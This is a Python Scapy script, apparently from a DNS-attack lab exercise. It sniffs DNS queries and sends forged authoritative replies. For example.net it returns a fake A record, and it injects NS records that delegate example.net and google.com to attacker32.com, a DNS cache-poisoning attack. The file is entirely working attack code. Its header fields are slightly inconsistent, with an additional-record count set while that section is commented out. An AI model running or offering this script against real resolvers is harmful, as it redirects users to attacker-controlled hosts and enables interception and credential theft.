#!/usr/bin/python
from scapy.all import *

def spoof_dns(pkt):
	if (DNS in pkt and b"example.net" in pkt[DNS].qd.qname):
		IPpkt = IP(dst=pkt[IP].src, src=pkt[IP].dst) # Swap the source and destination IP address
		UDPpkt = UDP(dport=pkt[UDP].sport, sport=53) # Swap the source and destination port number
		
		# The Answer Section
		Anssec = DNSRR(rrname=pkt[DNS].qd.qname, type="A", ttl=259200, rdata="13.13.13.13") 
		
		# The Authority Section
		NSsec1 = DNSRR(rrname="example.net", type="NS", ttl=259200, rdata="attacker32.com") 
		NSsec2 = DNSRR(rrname="google.com", type="NS", ttl=259200, rdata="attacker32.com")

		# The Additional Section
		#Addsec1 = DNSRR(rrname="ns1.example.net", type="A", ttl=259200, rdata="1.2.3.4")
		#Addsec2 = DNSRR(rrname="ns2.example.net", type="A", ttl=259200, rdata="5.6.7.8")

		# Construct the DNS packet
		DNSpkt = DNS(id=pkt[DNS].id, qd=pkt[DNS].qd, aa=1, rd=0, qr=1,qdcount=1, ancount=1, nscount=2, arcount=2, an=Anssec, ns=NSsec1/NSsec2)#, ar=Addsec1/Addsec2)

		# Construct the entire IP packet and send it out
		spoofpkt = IPpkt/UDPpkt/DNSpkt
		send(spoofpkt)

# Sniff UDP query packets and invoke spoof_dns().
pkt = sniff(filter="dst port 53", prn=spoof_dns)